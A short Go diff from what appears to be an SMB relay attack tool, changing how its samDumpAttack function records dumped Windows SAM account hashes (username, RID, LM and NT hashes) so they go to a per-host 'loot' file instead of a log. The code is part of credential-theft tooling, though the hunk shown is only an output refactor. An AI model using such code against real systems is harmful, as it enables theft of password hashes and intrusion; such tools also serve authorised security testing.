@@ -121,11 +121,13 @@ func samDumpAttack(client *SMBRelayClient, cfg *Config) error {
 		return fmt.Errorf("dump SAM: %v", err)
 	}
 
+	openDumpLoot(cfg, hostFromAddr(client.TargetAddr), "samdump")
 	for _, user := range users {
 		lmHash := hex.EncodeToString(user.LMHash)
 		ntHash := hex.EncodeToString(user.NTHash)
-		log.Printf("%s:%d:%s:%s:::", user.Username, user.RID, lmHash, ntHash)
+		dumpResultf("%s:%d:%s:%s:::", user.Username, user.RID, lmHash, ntHash)
 	}
+	closeDumpLoot()
 
 	// Cleanup
 	cleanupTempFiles(client, samTempFile, "")
